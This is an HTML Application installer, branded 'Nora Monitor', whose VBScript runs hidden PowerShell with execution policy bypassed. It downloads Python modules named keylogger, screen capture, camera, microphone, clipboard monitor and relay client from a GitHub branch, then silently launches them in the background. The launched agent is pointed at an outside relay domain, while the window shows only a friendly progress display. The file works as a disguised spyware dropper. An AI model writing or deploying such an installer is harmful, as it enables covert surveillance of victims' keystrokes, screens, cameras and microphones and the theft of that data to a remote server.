<html>
<head>
<meta http-equiv="x-ua-compatible" content="ie=11">
<HTA:APPLICATION
  APPLICATIONNAME="Nora Monitor"
  BORDER="thin"
  BORDERSTYLE="normal"
  CAPTION="yes"
  MAXIMIZEBUTTON="no"
  MINIMIZEBUTTON="no"
  SHOWINTASKBAR="yes"
  SINGLEINSTANCE="yes"
  SYSMENU="no"
  WINDOWSTATE="normal"
/>
<title>Nora Monitor — Installer</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body {
    background:#0d0d0d; color:#e0e0e0;
    font-family:Consolas,monospace;
    display:flex; flex-direction:column;
    align-items:center; justify-content:center;
    height:100vh; overflow:hidden;
    user-select:none;
  }

  #logo {
    font-size:22px; letter-spacing:6px; color:#7c6aff;
    text-transform:uppercase; margin-bottom:6px; font-weight:bold;
  }
  #tagline { font-size:11px; color:#444; letter-spacing:2px; margin-bottom:40px; }

  .ring-wrap { position:relative; width:80px; height:80px; margin-bottom:32px; }
  .ring {
    position:absolute; top:0; left:0;
    width:80px; height:80px;
    border:3px solid #1a1a1a;
    border-top:3px solid #7c6aff;
    border-radius:50%;
    animation:spin 0.9s linear infinite;
  }
  .ring2 {
    position:absolute; top:10px; left:10px;
    width:60px; height:60px;
    border:3px solid #1a1a1a;
    border-bottom:3px solid #a78bfa;
    border-radius:50%;
    animation:spin 1.3s linear infinite reverse;
  }
  .ring-icon {
    position:absolute; top:50%; left:50%;
    transform:translate(-50%,-50%);
    font-size:22px; line-height:1;
  }

  @keyframes spin {
    0%   { transform:rotate(0deg); }
    100% { transform:rotate(360deg); }
  }

  #status-label {
    font-size:13px; color:#aaa; margin-bottom:10px;
    min-height:18px; text-align:center;
  }
  #step-detail {
    font-size:10px; color:#444; margin-bottom:28px;
    text-align:center; min-height:14px;
  }

  #steps {
    display:flex; flex-direction:column; gap:7px;
    width:260px;
  }
  .step {
    display:flex; align-items:center; gap:10px;
    font-size:11px; color:#333;
    transition:color 0.3s;
  }
  .step.done   { color:#4ade80; }
  .step.active { color:#e0e0e0; }
  .step.error  { color:#f87171; }
  .step-dot {
    width:8px; height:8px; border-radius:50%;
    background:#222; flex-shrink:0;
    transition:background 0.3s;
  }
  .step.done   .step-dot { background:#4ade80; }
  .step.active .step-dot { background:#7c6aff; animation:pulse 1s infinite; }
  .step.error  .step-dot { background:#f87171; }

  @keyframes pulse {
    0%,100% { opacity:1; } 50% { opacity:0.3; }
  }

  #done-msg {
    display:none; text-align:center; margin-top:20px;
  }
  #done-msg .tick { font-size:36px; color:#4ade80; display:block; margin-bottom:8px; }
  #done-msg p { font-size:12px; color:#666; }
  #close-btn {
    margin-top:16px; padding:7px 24px;
    background:#7c6aff; border:none; color:#fff;
    border-radius:6px; font-size:12px; font-family:Consolas,monospace;
    cursor:pointer; letter-spacing:1px;
  }
  #close-btn:hover { background:#6d5ce7; }
</style>
</head>
<body onload="init()">

<div id="logo">NORA</div>
<div id="tagline">Monitor Installer</div>

<div class="ring-wrap" id="spinner">
  <div class="ring"></div>
  <div class="ring2"></div>
  <span class="ring-icon">⚡</span>
</div>

<div id="status-label">Initializing…</div>
<div id="step-detail">&nbsp;</div>

<div id="steps">
  <div class="step" id="s0"><div class="step-dot"></div>Create directories</div>
  <div class="step" id="s1"><div class="step-dot"></div>Download files</div>
  <div class="step" id="s2"><div class="step-dot"></div>Check Python</div>
  <div class="step" id="s3"><div class="step-dot"></div>Install dependencies</div>
  <div class="step" id="s4"><div class="step-dot"></div>Launch agent</div>
</div>

<div id="done-msg">
  <span class="tick">✓</span>
  <p>Nora Monitor is running in the background.</p>
  <button id="close-btn" onclick="window.close()">Close</button>
</div>

<script language="VBScript">
Dim sh, fs

Sub init()
  Set sh = CreateObject("WScript.Shell")
  Set fs = CreateObject("Scripting.FileSystemObject")
  window.resizeTo 360, 480
  Call CenterWindow()
  Call RunStep0()
End Sub

Sub CenterWindow()
  Dim sw, sh2
  sw = screen.width  : sh2 = screen.height
  window.moveTo (sw - 360) / 2, (sh2 - 480) / 2
End Sub

Function DIR()
  DIR = sh.ExpandEnvironmentStrings("%APPDATA%") & "\NoraMonitor"
End Function

Sub SetStep(idx, state)
  Dim el
  Set el = document.getElementById("s" & idx)
  el.className = "step " & state
End Sub

Sub SetStatus(msg, detail)
  document.getElementById("status-label").innerText = msg
  document.getElementById("step-detail").innerText = detail
End Sub

Sub RunPS(cmd)
  sh.Run "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command """ & cmd & """", 0, True
End Sub

' ── Step 0: Create dirs ───────────────────────────────────────────────────────
Sub RunStep0()
  SetStep 0, "active"
  SetStatus "Creating directories…", DIR()
  If Not fs.FolderExists(DIR()) Then fs.CreateFolder(DIR())
  If Not fs.FolderExists(DIR() & "\templates") Then fs.CreateFolder(DIR() & "\templates")
  If Not fs.FolderExists(DIR() & "\recordings") Then fs.CreateFolder(DIR() & "\recordings")
  SetStep 0, "done"
  window.setTimeout "RunStep1()", 300
End Sub

' ── Step 1: Download files ────────────────────────────────────────────────────
Sub RunStep1()
  SetStep 1, "active"
  SetStatus "Downloading files…", "From GitHub"
  Dim raw, files, d, ps
  raw   = "https://raw.githubusercontent.com/smallkhk/Nora-signal/claude/legitimate-keylogger-lm3rqu/nora-monitor"
  files = "'app.py','keylogger.py','screencap.py','controller.py','server.py','recorder.py','camera.py','clipboard_monitor.py','processes.py','relay_client.py','file_manager.py','microphone.py','requirements.txt'"
  d     = DIR()
  ps    = "$ProgressPreference='SilentlyContinue'; $r='" & raw & "'; $d='" & d & "';" & _
          files & " -split ',' | %{ try { Invoke-WebRequest ""$r/$_"" -OutFile ""$d\$_"" -EA Stop } catch {} };" & _
          "try { Invoke-WebRequest ""$r/templates/viewer.html"" -OutFile ""$d\templates\viewer.html"" -EA Stop } catch {}"
  RunPS ps
  SetStep 1, "done"
  window.setTimeout "RunStep2()", 300
End Sub

' ── Step 2: Check / install Python ───────────────────────────────────────────
Sub RunStep2()
  SetStep 2, "active"
  SetStatus "Checking Python…", ""
  Dim ret
  ret = sh.Run("python --version", 0, True)
  If ret <> 0 Then
    SetStatus "Installing Python 3.11…", "This may take a minute"
    RunPS "Invoke-WebRequest 'https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe' -OutFile ""$env:TEMP\pysetup.exe""; Start-Process ""$env:TEMP\pysetup.exe"" '/quiet InstallAllUsers=0 PrependPath=1' -Wait"
  End If
  SetStep 2, "done"
  window.setTimeout "RunStep3()", 300
End Sub

' ── Step 3: pip install ───────────────────────────────────────────────────────
Sub RunStep3()
  SetStep 3, "active"
  SetStatus "Installing dependencies…", "pip install -r requirements.txt"
  Dim d, ps
  d  = DIR()
  ps = "$env:Path=[System.Environment]::GetEnvironmentVariable('Path','Machine')+';'+[System.Environment]::GetEnvironmentVariable('Path','User');" & _
       "pip install -r """ & d & "\requirements.txt"" -q --no-warn-script-location"
  RunPS ps
  SetStep 3, "done"
  window.setTimeout "RunStep4()", 300
End Sub

' ── Step 4: Launch ───────────────────────────────────────────────────────────
Sub RunStep4()
  SetStep 4, "active"
  SetStatus "Launching agent…", ""
  Dim d, ps
  d  = DIR()
  ps = "$env:NORA_RELAY='https://mon.eclipselivecam.online';" & _
       "$env:Path=[System.Environment]::GetEnvironmentVariable('Path','Machine')+';'+[System.Environment]::GetEnvironmentVariable('Path','User');" & _
       "Start-Process pythonw """ & d & "\app.py"" -WorkingDirectory """ & d & """"
  RunPS ps
  SetStep 4, "done"
  window.setTimeout "ShowDone()", 400
End Sub

Sub ShowDone()
  SetStatus "All done!", ""
  document.getElementById("spinner").style.display = "none"
  document.getElementById("done-msg").style.display = "block"
End Sub
</script>
</body>
</html>
